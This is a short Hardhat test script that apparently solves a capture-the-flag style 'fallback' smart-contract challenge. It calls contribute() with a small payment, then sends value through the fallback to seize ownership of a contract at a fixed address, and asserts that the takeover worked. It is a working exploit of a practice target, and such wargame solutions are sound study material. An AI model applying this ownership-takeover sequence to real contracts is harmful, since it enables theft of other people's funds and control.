import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("fallback", function() {
    it("Should solve fallback challenge", async function(){ 
        this.timeout(0);

        // setup check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function contribute() public payable",
            "function fallback() external payable",
            "function owner() public view returns (address)",
        ]
        const targetAddr = "0x50B3608917C095a17F3fB02E2E0eEd7E6497Fb33";

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let target = contract.connect(eoa);

        // call contribute, it is the first condition
        let tx = await target.contribute({ value: utils.parseEther("0.00005") });
        await tx.wait();
        console.log(tx);

        /*
        * call fallback, it may be any function name or transaction with value and data
        * however I name it for clarity
        */
        tx = await target.fallback({ value: utils.parseEther("0.00005")})
        await tx.wait();
        console.log(tx);

        let owner = await target.owner();
        expect(owner).to.eq(eoa.address);
    });
});